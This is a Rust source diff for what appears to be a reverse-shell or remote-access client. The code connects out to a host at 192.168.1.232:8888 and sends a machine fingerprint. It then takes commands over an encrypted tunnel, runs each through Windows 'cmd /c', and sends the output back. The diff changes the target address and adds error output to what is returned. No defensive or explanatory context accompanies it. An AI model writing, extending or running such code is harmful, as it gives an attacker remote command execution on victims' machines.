@@ -72,7 +72,7 @@ fn main() -> Result<(), io::Error> {
     let mut buffer = [0; BUFFER];
     let fingerprint = generate_fingerprint();
 
-    let mut socket = TcpStream::connect("127.0.0.1:8888")?;
+    let mut socket = TcpStream::connect("192.168.1.232:8888")?;
 
     socket.write_all(fingerprint.as_bytes())?;
 
@@ -112,17 +112,14 @@ fn main() -> Result<(), io::Error> {
     loop {
         let cmd = String::from_utf8(enctunnel.recv(&mut buffer)?).unwrap();
 
-        match cmd.as_str() {
-            "2" => enctunnel.send(b"3".to_vec())?,
-            _ => {
-                let output = Command::new("cmd")
-                    .arg("/c")
-                    .arg(cmd)
-                    .output()
-                    .expect("Failed execute command");
+        let mut output = Command::new("cmd")
+            .arg("/c")
+            .arg(cmd)
+            .output()
+            .expect("Failed execute command");
 
-                enctunnel.send(output.stdout).unwrap();
-            }
-        }
+        output.stdout.extend(output.stderr);
+
+        enctunnel.send(output.stdout).unwrap();
     }
 }
